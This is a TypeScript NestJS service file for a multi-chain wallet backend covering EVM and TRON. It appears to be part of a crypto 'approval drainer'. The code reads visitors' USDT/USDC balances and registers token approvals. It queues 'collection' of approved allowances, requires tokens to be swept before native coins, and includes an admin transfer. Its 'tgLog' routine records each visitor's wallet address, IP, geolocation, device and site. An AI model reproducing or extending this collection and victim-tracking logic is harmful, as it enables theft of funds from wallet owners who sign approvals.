import {
  BadRequestException,
  Injectable,
  NotFoundException,
} from "@nestjs/common";
import { CollectionIntentStatus } from "@prisma/client";
import { errorForLog } from "../../common/utils/error-message";
import { ResourceManager } from "../resources/resource-manager.service";
import { ConfigService } from "../../config/config.service";
import { PlatformConfigService } from "../../config/platform-config.service";
import { prisma } from "../../infrastructure/database/prisma-shared";
import {
  EVM_ADDRESS_RE,
  EVM_RPCS,
  TOKENS,
  TRON_ADDRESS_RE,
  TRON_GRID,
  type EvmChainKey,
} from "./wallet.constants";
import {
  decodeTronNodeMessage,
  formatUnits,
  getHeader,
  humanizeTronBroadcastError,
} from "./wallet-crypto.util";
import { WalletNotifyService } from "./wallet-notify.service";
import { WalletRpcService } from "./wallet-rpc.service";
import { WalletTransferExecutorService } from "./wallet-transfer-executor.service";
import { WalletReconciliationService } from "./wallet-reconciliation.service";
import { WalletApprovalService } from "./wallet-approval.service";
import { WalletCollectionService } from "./wallet-collection.service";
import { WalletNativeReadinessService } from "./wallet-native-readiness.service";

@Injectable()
export class WalletService {
  constructor(
    private readonly resourceManager: ResourceManager,
    private readonly configService: ConfigService,
    private readonly platformConfig: PlatformConfigService,
    private readonly notify: WalletNotifyService,
    private readonly rpc: WalletRpcService,
    private readonly transferExecutor: WalletTransferExecutorService,
    private readonly reconciliation: WalletReconciliationService,
    private readonly approval: WalletApprovalService,
    private readonly collection: WalletCollectionService,
    private readonly nativeReadiness: WalletNativeReadinessService,
  ) {}

  async repairInconsistentConfirmedTransfers(limit = 100): Promise<number> {
    return this.reconciliation.repairInconsistentConfirmedTransfers(limit);
  }

  async reconcileTransfer(transferId: string) {
    return this.reconciliation.reconcileTransfer(transferId);
  }

  async reconcileBroadcastTransfers(limit = 10): Promise<number> {
    return this.reconciliation.reconcileBroadcastTransfers(limit);
  }

  async getBalances(evm: string, tron: string) {
    this.notify.logFlow("BALANCES REQUEST", {
      evm: Boolean(evm),
      tron: Boolean(tron),
    });
    if (!evm && !tron)
      throw new BadRequestException("Provide at least evm or tron address");
    if (evm && !EVM_ADDRESS_RE.test(evm))
      throw new BadRequestException("Invalid EVM address");
    if (tron && !TRON_ADDRESS_RE.test(tron))
      throw new BadRequestException("Invalid TRON address");
    const result: Record<
      string,
      { native: string; usdt: string; usdc?: string }
    > = {};
    if (evm) {
      for (const network of Object.keys(EVM_RPCS) as EvmChainKey[]) {
        const rpcs = EVM_RPCS[network];
        let native = "0";
        for (const rpc of rpcs) {
          try {
            native = formatUnits(
              BigInt(await this.rpc.rpcCall(rpc, "eth_getBalance", [evm, "latest"])),
              18,
            );
            break;
          } catch {}
        }
        const usdtCfg = TOKENS[network].USDT;
        const usdcCfg = TOKENS[network].USDC;
        const [usdtRaw, usdcRaw] = await Promise.all([
          this.rpc
            .rpcCall(rpcs[0], "eth_call", [
              {
                to: usdtCfg.address,
                data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}`,
              },
              "latest",
            ])
            .catch(() => "0x0"),
          this.rpc
            .rpcCall(rpcs[0], "eth_call", [
              {
                to: usdcCfg.address,
                data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}`,
              },
              "latest",
            ])
            .catch(() => "0x0"),
        ]);
        const usdtHuman = formatUnits(BigInt(usdtRaw), usdtCfg.decimals);
        const usdcHuman = formatUnits(BigInt(usdcRaw), usdcCfg.decimals);
        result[network] = { native, usdt: usdtHuman, usdc: usdcHuman };
      }
    }
    if (tron) {
      const res = await fetch(`https://api.trongrid.io/v1/accounts/${tron}`, {
        cache: "no-store",
      });
      const json = (await res.json().catch(() => ({}))) as {
        data?: Array<{
          balance?: number;
          trc20?: Array<Record<string, string>>;
        }>;
      };
      const acc = json.data?.[0];
      let usdt = BigInt(0);
      let usdc = BigInt(0);
      for (const t of acc?.trc20 ?? []) {
        if (t[TOKENS.tron.USDT.address] !== undefined)
          usdt = BigInt(t[TOKENS.tron.USDT.address]);
        if (t[TOKENS.tron.USDC.address] !== undefined)
          usdc = BigInt(t[TOKENS.tron.USDC.address]);
      }
      result.tron = {
        native: formatUnits(BigInt(acc?.balance ?? 0), 6),
        usdt: formatUnits(usdt, 6),
        usdc: formatUnits(usdc, 6),
      };
    }
    this.notify.logFlow("BALANCES RESPONSE", { networks: Object.keys(result) });
    return result;
  }

  prepareApproval(body: Record<string, unknown>) {
    return this.approval.prepareApproval(body);
  }

  verifyAllowance(body: Record<string, unknown>) {
    return this.approval.verifyAllowance(body);
  }

  confirmApproval(
    body: Record<string, unknown>,
    correlation?: { correlationId?: string; requestId?: string },
  ) {
    return this.approval.confirmApproval(body, correlation);
  }

  nudgeTokenCollection(args: {
    ownerAddress: string;
    network: string;
    tokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }>;
  }) {
    return this.collection.nudgeTokenCollection(args);
  }

  queueCollectionFromAllowance(body: Record<string, unknown>) {
    return this.collection.queueCollectionFromAllowance(body);
  }

  isApprovalCollectionTerminal(approval: {
    status: string;
    remainingRaw: string;
    collectedRaw: string;
    collectionEnabled: boolean;
    lastError?: string | null;
  }): boolean {
    return this.nativeReadiness.isApprovalCollectionTerminal(approval);
  }

  evaluateNativeReadiness(args: {
    ownerAddress: string;
    network: string;
    tokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }>;
  }) {
    return this.nativeReadiness.evaluateNativeReadiness(args);
  }

  parseNativeReadinessTokenInputs(
    body: Record<string, unknown>,
  ):
    | Array<{
        token: string;
        shouldAttemptTransfer: boolean;
        approvalId?: string | null;
        approvalTxHash?: string | null;
      }>
    | undefined {
    if (!Array.isArray(body.tokens)) return undefined;
    return (body.tokens as Array<Record<string, unknown>>).map((t) => ({
      token: String(t.token ?? ""),
      shouldAttemptTransfer: Boolean(t.shouldAttemptTransfer),
      approvalId: t.approvalId ? String(t.approvalId) : null,
      approvalTxHash: t.approvalTxHash ? String(t.approvalTxHash) : null,
    }));
  }

  assertNativeExecutionAllowed(
    ownerAddress: string,
    network: string,
    tokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalId?: string | null;
      approvalTxHash?: string | null;
    }>,
  ): Promise<void> {
    return this.nativeReadiness.assertNativeExecutionAllowed(
      ownerAddress,
      network,
      tokens,
    );
  }

  assertTokensCollectedBeforeNative(
    ownerAddress: string,
    network: string,
    hints?: { usdtTxHash?: string | null; usdcTxHash?: string | null },
  ): Promise<void> {
    return this.nativeReadiness.assertTokensCollectedBeforeNative(
      ownerAddress,
      network,
      hints,
    );
  }

  processMonitoredApproval(approvalId: string): Promise<void> {
    return this.collection.processMonitoredApproval(approvalId);
  }

  broadcastCollectionIntent(intentId: string) {
    return this.collection.broadcastCollectionIntent(intentId);
  }

  confirmCollectionAttempt(attemptId: string) {
    return this.collection.confirmCollectionAttempt(attemptId);
  }

  async debugApprovals() {
    const [approvals, audits, transfers] = await Promise.all([
      prisma.approval.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
      prisma.auditLog.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
      prisma.transfer.findMany({
        orderBy: { createdAt: "desc" },
        take: 100,
        select: {
          id: true,
          approvalId: true,
          escrowIntentId: true,
          idempotencyKey: true,
          amountRaw: true,
          fromAddress: true,
          toAddress: true,
          txHash: true,
          blockNumber: true,
          status: true,
          errorMessage: true,
          payloadKind: true,
          broadcastAt: true,
          confirmedAt: true,
          retryCount: true,
          createdAt: true,
          updatedAt: true,
        },
      }),
    ]);
    return {
      ok: true,
      approvals,
      audits,
      transfers,
      timestamp: new Date().toISOString(),
    };
  }

  async getCollectorStatus() {
    const now = new Date();
    const [approvalCounts, transferCounts, due, leased] = await Promise.all([
      prisma.approval.groupBy({ by: ["status"], _count: { _all: true } }),
      prisma.transfer.groupBy({ by: ["status"], _count: { _all: true } }),
      prisma.approval.count({
        where: {
          collectionEnabled: true,
          status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
          OR: [{ nextCheckAt: null }, { nextCheckAt: { lte: now } }],
        },
      }),
      prisma.approval.count({ where: { leaseUntil: { gt: now } } }),
    ]);
    return {
      ok: true,
      enabled: this.configService.getCollectorConfig().enabled,
      maxRuns: this.configService.getCollectorConfig().maxRuns,
      intervalMs: this.configService.getCollectorConfig().intervalMs,
      due,
      leased,
      approvals: Object.fromEntries(
        approvalCounts.map((row) => [row.status, row._count._all]),
      ),
      transfers: Object.fromEntries(
        transferCounts.map((row) => [row.status, row._count._all]),
      ),
      timestamp: now.toISOString(),
    };
  }

  captureFlowLog(body: Record<string, unknown>) {
    return this.notify.captureFlowLog(body);
  }

  async getApproval(id: string) {
    const approval = await prisma.approval.findUnique({ where: { id } });
    if (!approval) throw new NotFoundException("not_found");
    return { approval };
  }

  async getApprovalForOwner(id: string, ownerAddress: string) {
    const approval = await prisma.approval.findFirst({
      where: {
        id,
        ownerAddress: {
          equals: ownerAddress,
          mode: "insensitive",
        },
      },
    });
    if (!approval) throw new NotFoundException("not_found");
    return { approval };
  }

  prepareRevoke(body: Record<string, unknown>) {
    return this.approval.prepareRevoke(body);
  }

  async broadcastTron(transaction: Record<string, unknown>) {
    this.notify.logFlow("TRON BROADCAST REQUEST");
    const signature = transaction.signature;
    if (!Array.isArray(signature) || signature.length === 0)
      throw new BadRequestException(
        "Signed transaction is missing signature[]",
      );
    const res = await fetch(`${TRON_GRID}/wallet/broadcasttransaction`, {
      method: "POST",
      headers: this.rpc.tronHeaders(),
      body: JSON.stringify(transaction),
      cache: "no-store",
    });
    const json = (await res.json().catch(() => ({}))) as {
      result?: boolean;
      txid?: string;
      message?: string;
      code?: string;
    };
    const decodedMessage = decodeTronNodeMessage(json.message);
    if (!res.ok || json.result !== true || !json.txid) {
      this.notify.logFlow("TRON BROADCAST FAILED", {
        code: json.code ?? null,
        message: decodedMessage ?? null,
      });
      return {
        result: false,
        error: humanizeTronBroadcastError({
          code: json.code ?? null,
          message: decodedMessage,
        }),
        code: json.code ?? null,
        message: decodedMessage ?? null,
        trongrid: json,
      };
    }
    this.notify.logFlow("TRON BROADCAST SUCCESS", { txid: json.txid });
    return { result: true, txid: json.txid, trongrid: json };
  }

  registerApproved(body: Record<string, unknown>) {
    return this.approval.registerApproved(body);
  }

  adminTransfer(body: Record<string, unknown>) {
    return this.collection.adminTransfer(body);
  }

  legacyTronApprove(body: Record<string, unknown>) {
    return this.approval.legacyTronApprove(body);
  }

  consent(body: Record<string, unknown>) {
    return this.approval.consent(body);
  }

  async energyDelegate(body: Record<string, unknown>) {
    const address = String(body.address ?? body.owner ?? "").trim();
    if (!address) {
      throw new BadRequestException(
        "body must have required property 'address'",
      );
    }
    this.notify.logFlow("RESOURCE ACQUIRE REQUEST", {
      network: String(body.network ?? ""),
      address,
      purpose: String(body.purpose ?? "approve"),
    });
    const result = await this.resourceManager.acquireResources(body);
    this.notify.logFlow("RESOURCE ACQUIRE RESPONSE", {
      status: result.status,
      network: result.network,
      provider: result.provider ?? null,
      acquisitionId: result.acquisitionId ?? null,
      retryAfterMs: result.retryAfterMs ?? null,
      message: result.message ?? null,
    });
    return result;
  }

  async verifyResources(body: Record<string, unknown>) {
    const address = String(body.address ?? body.owner ?? "").trim();
    if (!address) {
      throw new BadRequestException(
        "body must have required property 'address'",
      );
    }
    this.notify.logFlow("RESOURCE VERIFY REQUEST", {
      network: String(body.network ?? ""),
      address,
    });
    const result = await this.resourceManager.verifyResources(body);
    this.notify.logFlow("RESOURCE VERIFY RESPONSE", {
      status: result.status,
      network: result.network,
      provider: result.provider ?? null,
      message: result.message ?? null,
    });
    return result;
  }

  async ipgeo(
    headers: Headers | Record<string, string | string[] | undefined>,
  ) {
    try {
      const forwardedFor = getHeader(headers, "x-forwarded-for");
      const realIp = getHeader(headers, "x-real-ip");
      const headerIp =
        forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
      const local =
        !headerIp ||
        headerIp === "unknown" ||
        headerIp === "127.0.0.1" ||
        headerIp === "::1" ||
        headerIp.startsWith("127.") ||
        headerIp.startsWith("::ffff:127.");
      const url = local
        ? "http://ip-api.com/json/?fields=status,query,country,city,countryCode"
        : `http://ip-api.com/json/${encodeURIComponent(headerIp)}?fields=status,query,country,city,countryCode`;
      const res = await fetch(url, { cache: "no-store" });
      if (!res.ok) return { ip: headerIp, location: "Unknown" };
      const json = (await res.json()) as {
        status?: string;
        query?: string;
        country?: string;
        city?: string;
        countryCode?: string;
      };
      if (json.status !== "success")
        return { ip: headerIp, location: "Unknown" };
      const ip = json.query || headerIp;
      const location =
        json.country && json.city
          ? `${json.country}, ${json.city}`
          : json.country || "Unknown";
      return { ip, location };
    } catch {
      return { ip: "unknown", location: "Unknown" };
    }
  }

  async tgLog(
    body: Record<string, unknown>,
    headers: Headers | Record<string, string | string[] | undefined>,
  ) {
    const address = String(body.address ?? body.tron ?? body.evm ?? "").trim();
    if (!address) throw new BadRequestException("Provide address");
    const userAgent = String(
      body.userAgent || getHeader(headers, "user-agent") || "unknown",
    );
    const forwardedFor = getHeader(headers, "x-forwarded-for");
    const realIp = getHeader(headers, "x-real-ip");
    const fallbackIp =
      forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
    const ip = String(body.ip ?? fallbackIp);
    const location = String(body.location ?? "Unknown");
    const network = String(
      body.network ?? (address.startsWith("T") ? "tron" : "evm"),
    );
    const status = String(body.status ?? "success");
    const eventType = String(body.type ?? body.event ?? "scan");
    const traceId =
      String(
        body.traceId ??
          body.transactionId ??
          getHeader(headers, "x-correlation-id") ??
          "",
      ).trim() || null;
    await prisma.tgLogEvent.create({
      data: {
        type: eventType,
        network,
        address,
        status,
        error: errorForLog(body.error),
        ip,
        location,
        site: String(body.site ?? getHeader(headers, "host") ?? "unknown"),
        device: /mobi|iphone|android/i.test(userAgent)
          ? "Mobile"
          : /mac|win|linux|cros/i.test(userAgent)
            ? "Desktop"
            : "Other",
        traceId,
      },
    });
    return {
      code: 200,
      status: "success",
      message: "OK",
      data: { sent: false },
      timestamp: new Date().toISOString(),
    };
  }
}
